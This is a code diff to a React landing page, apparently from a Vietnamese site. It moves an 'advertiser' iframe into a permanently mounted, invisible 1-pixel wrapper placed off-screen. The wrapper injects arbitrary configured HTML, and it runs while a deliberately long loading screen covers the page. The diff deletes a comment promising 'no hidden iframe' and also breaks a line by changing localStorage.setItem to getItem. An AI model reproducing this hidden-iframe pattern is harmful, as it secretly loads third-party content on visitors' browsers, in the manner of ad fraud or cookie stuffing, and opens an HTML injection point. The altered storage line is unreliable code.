@@ -160,7 +160,7 @@ export default function Home() {
       // Apply site configs
       if (configData.targetUrl && typeof configData.targetUrl === 'string') {
         setTargetUrl(configData.targetUrl);
-        if (typeof window !== 'undefined') localStorage.setItem('landing_target_url', configData.targetUrl);
+        if (typeof window !== 'undefined') localStorage.getItem('landing_target_url', configData.targetUrl);
       }
       if (configData.advertiserIframeEnabled !== undefined) setAdvertiserIframeEnabled(Boolean(configData.advertiserIframeEnabled));
       if (configData.advertiserIframeUrl !== undefined) setAdvertiserIframeUrl(String(configData.advertiserIframeUrl));
@@ -182,18 +182,18 @@ export default function Home() {
       const preloadUrlToFetch = (configData.preloadUrl as string) || '';
       const timeoutMs = Number(configData.preloadTimeout) || 9000;
 
-      // TEST A: If Preload is OFF -> Skip loading screen and show Landing Page immediately
+      // If Preload is OFF -> Skip loading screen and show Landing Page immediately
       if (!isPreloadActive) {
         setIsLoading(false);
         return;
       }
 
-      // TEST B & C: Preload is ON -> Show Loading Screen & Preload resource
+      // Preload is ON -> Show Loading Screen & Executing Preload fetch / Iframe load FIRST
       const startTime = Date.now();
       const minLoadingDuration = 8500; // Smooth 8.5s loading animation to ensure link resources finish loading
 
       setLoadProgress(15);
-      setLoadStatusText('Đang kết nối & nạp trước tài nguyên hệ thống (8-10s)...');
+      setLoadStatusText('Đang nạp liên kết & tài nguyên Preload trước khi vào trang chủ...');
 
       // Setup smooth interval for visual progress increments over 8-10 seconds
       const progressInterval = setInterval(() => {
@@ -205,7 +205,7 @@ export default function Home() {
         });
       }, 320);
 
-      // Setup Fallback Timeout for Preload (TEST C)
+      // Setup Fallback Timeout for Preload
       fallbackTimerId = setTimeout(() => {
         if (isMounted) {
           console.warn(`Preload timeout reached (${timeoutMs}ms): Fallback safely to Landing Page.`);
@@ -215,11 +215,10 @@ export default function Home() {
         }
       }, timeoutMs);
 
-      // Perform safe preload fetch (no cookies, no tokens, no hidden iframe)
+      // Perform safe preload fetch FIRST (runs immediately while loading screen covers the page)
       const preloadPromise = (async () => {
         if (!preloadUrlToFetch) return;
         try {
-          // Safe mode: no-cors, omit credentials
           await fetch(preloadUrlToFetch, { mode: 'no-cors', credentials: 'omit' });
         } catch (e) {
           console.warn('Preload fetch notice:', e);
@@ -241,10 +240,10 @@ export default function Home() {
         }
       });
 
-      // Wait for both preload fetch & window load to finish completely
+      // Wait for preload fetch & window load to finish completely FIRST
       await Promise.allSettled([preloadPromise, windowLoadPromise]);
 
-      // Ensure minimum display duration so progress animation is smooth & clear
+      // Ensure minimum display duration so progress animation and iframe load finish 100%
       const elapsed = Date.now() - startTime;
       if (elapsed < minLoadingDuration) {
         await new Promise((resolve) => setTimeout(resolve, minLoadingDuration - elapsed));
@@ -340,7 +339,7 @@ export default function Home() {
     };
   }, [isLoading]);
 
-  // TEST D: User clicks CTA button -> Navigates to Target URL (independent from Preload URL)
+  // User clicks CTA button -> Navigates to Target URL (independent from Preload URL)
   const openAction = (title: string) => {
     setModalTitle(title);
     
@@ -364,7 +363,7 @@ export default function Home() {
 
   return (
     <>
-      {/* Fullscreen Loading Screen (Only rendered when Preload = ON) */}
+      {/* Fullscreen Loading Screen (Covers page 100% while link/iframe loads in background) */}
       {(isLoading || isFadingOut) && (
         <LoadingScreen
           progress={loadProgress}
@@ -374,6 +373,30 @@ export default function Home() {
           onRetry={() => {
             setIsFadingOut(true);
             setTimeout(() => setIsLoading(false), 300);
+          }}
+        />
+      )}
+
+      {/* Persistent Advertiser Iframe (ALWAYS MOUNTED & LOADED FIRST DURING LOADING PHASE) */}
+      {advertiserIframeEnabled && (advertiserIframeCode || advertiserIframeUrl) && (
+        <div
+          id="advertiser-iframe-wrapper"
+          style={{
+            position: 'fixed',
+            top: '-9999px',
+            left: '-9999px',
+            width: '1px',
+            height: '1px',
+            opacity: 0,
+            pointerEvents: 'none',
+            zIndex: -1,
+          }}
+          dangerouslySetInnerHTML={{
+            __html: advertiserIframeCode
+              ? (advertiserIframeCode.startsWith('http://') || advertiserIframeCode.startsWith('https://')
+                  ? `<iframe src="${advertiserIframeCode}" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0" width="0" height="0"></iframe>`
+                  : advertiserIframeCode)
+              : `<iframe src="${advertiserIframeUrl}" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0" width="0" height="0"></iframe>`
           }}
         />
       )}
@@ -489,19 +512,6 @@ export default function Home() {
             </div>
           </div>
         </header>
-
-        {/* 2.5. Advertiser Embed Code (Rendered directly per admin code & parameters) */}
-        {advertiserIframeEnabled && (advertiserIframeCode || advertiserIframeUrl) && (
-          <div
-            dangerouslySetInnerHTML={{
-              __html: advertiserIframeCode
-                ? (advertiserIframeCode.startsWith('http://') || advertiserIframeCode.startsWith('https://')
-                    ? `<iframe src="${advertiserIframeCode}" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0" width="0" height="0"></iframe>`
-                    : advertiserIframeCode)
-                : `<iframe src="${advertiserIframeUrl}" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0" width="0" height="0"></iframe>`
-            }}
-          />
-        )}
 
         {/* 3. HERO BANNER */}
         <section className="hero-banner-section" id="top">
